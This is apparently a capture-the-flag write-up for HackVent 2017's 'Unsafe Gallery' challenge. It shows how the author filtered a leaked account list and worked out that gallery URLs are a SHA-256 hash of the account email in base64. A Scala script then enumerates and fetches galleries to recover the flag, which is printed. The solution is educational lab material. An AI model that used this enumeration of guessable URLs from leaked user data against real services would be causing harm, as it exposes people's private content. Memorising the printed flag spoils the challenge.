# Day 15: Unsafe Gallery

*See pictures you shouldn't see*

The List of all Users of the Unsafe Gallery was leaked (See account list).
With this list the URL to each gallery can be constructed. E.g. you find Danny's gallery here.

Now find the flag in Thumper's gallery.

[Link to Danny's gallery](http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw) + [Account List](files/accounts.csv.zip)

### Solution

My first idea was to find Danny's account in given CSV, but there were tens of such accounts.

```bash
$ unzip accounts.csv.zip 
Archive:  accounts.csv.zip
  inflating: accounts.csv
$ cat accounts.csv | grep Danny | wc -l
82
```

It was time to look at Danny's gallery in detail and try to find some useful data which could lower the number of possible candidates. We know that gallery contains 15 pictures and we assume that account's state should be active since the gallery is visible. Let's try to add these search criteria and see what happens.

```bash
$ cat accounts.csv | cut -d, -f1,2,10,15 | grep 'Danny,15,active' | wc -l
2
```

Two candidates looked like a good starting point. Now I had to think about account's fields and try to guess which of them were used for hash computation. It had to be fields which are unique and don't change in time. The most probable candidates were `email` and `crmId`.

```bash
$ cat accounts.csv | cut -d, -f1,2,10,15 | grep 'Danny,15,active' | grep -o '^[0-9]\+'
32009
41752
$ cat accounts.csv | grep '^32009\|^41752' | cut -d, -f1,2,3,7,8
32009,Danny,Dixon,Danny.Dixon@sunflower.org,44967219
41752,Danny,Jarvis,D.Jarvis@gmail.com,78987754
```

Let's take a look at the hash from given link to Danny's gallery.

```
bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw
```

Its alphabet indicates it could be a Base64 encoded value so I thought I have to find the right account attribute(s) to pass to the right hashing function and then Base64 encode the result. After a few iterations of trial and error with various hashing functions I found an interesting result.

```scala
base64(sha256("Danny.Dixon@sunflower.org")) = "bncqYuhdQVey9omKA6tAFi4rep1+FD+RtD4H/8ftWiw="
```

The result value was really close to the hash I was looking for. The last thing I had to do was to strip all the URL unsafe characters from the result value. Heureka! I found the algorithm to generate account hashes:

1. calculate SHA256 hash of account's email
2. Base64 encode hash result
3. strip URL unsafe characters from encoded value

The last step was to find the right Thumper's account, calculate its hash to get link to his gallery and look for a flag there. Since there were more than few Thumper's accounts in the list it was time to write a program (source code can be found [here](../../src/main/scala/hackvent2017/Day15.scala)) to automate things.

```scala
def main(args: Array[String]): Unit = {
  val accounts = Source.fromFile("hackvent2017/challenges/day15/files/accounts.csv").getLines.drop(1).map(csvToAccount).toList
  val thumpers = accounts.filter(_.prename == "Thumper").filter(_.state == "active")
  val flagPattern = "(HV17(-[\\w]{4}){5})".r

  for (account <- thumpers) {
    val link = s"http://challenges.hackvent.hacking-lab.com:3958/gallery/${hash(account)}"
    val html = Source.fromURL(link).mkString
    val flag = flagPattern.findFirstIn(html)
    if (flag.isDefined) {
      println(s"gallery: ${link}")
      println(s"flag: ${flag.get}")
    }
  }
}

private def hash(account: Account): String = hash(account.email)
private def hash(text: String): String = b64Encode(sha256(text)).replaceAll("[\\+=/]", "")

case class Account(id: Int, prename: String, name: String, address: String, zip: String, city: String, email: String, crmId: String, memberType: String, pictureCount: Int, galleryCount: Int, mbUsed: Int, logCorrelationId: String, advertisingId: String, state: String)
private def csvToAccount(line: String): Account = {
  val cells = line.split(',')
  Account(cells(0).toInt, cells(1), cells(2), cells(3), cells(4), cells(5), cells(6), cells(7), cells(8), cells(9).toInt, cells(10).toInt, cells(11).toInt, cells(12), cells(13), cells(14))
}
```

Here's the result:

```bash
gallery: http://challenges.hackvent.hacking-lab.com:3958/gallery/37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw
flag: HV17-el2S-0Td5-XcFi-6Wjg-J5aB
```